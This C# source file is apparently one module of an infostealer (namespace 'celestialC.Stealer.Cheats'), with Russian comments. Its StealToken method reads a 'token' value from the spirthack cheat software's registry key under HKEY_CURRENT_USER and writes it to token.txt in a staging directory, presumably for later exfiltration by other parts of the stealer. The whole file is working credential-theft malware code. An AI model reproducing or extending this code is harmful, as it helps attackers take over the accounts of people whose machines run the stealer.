using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace celestialC.Stealer.Cheats
{
    internal static class spirthack
    {
        internal static async Task<int> StealToken(string dst)
        {
            try
            {
                // Открытие ветки реестра
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\spirthack");
                if (registryKey != null)
                {
                    // Получение значения ключа
                    string token = registryKey.GetValue("token")?.ToString();
                    registryKey.Close();
                    if (!string.IsNullOrEmpty(token))
                    {
                        Directory.CreateDirectory(dst);
                        File.AppendAllText(dst + "\\token.txt", token);
                        return 1;
                    }
                    else
                    {
                        return 0;
                    }
                }
                else
                {
                    return 0;
                }
            }
            catch
            {
                return 0;
            }
        }
    }
}
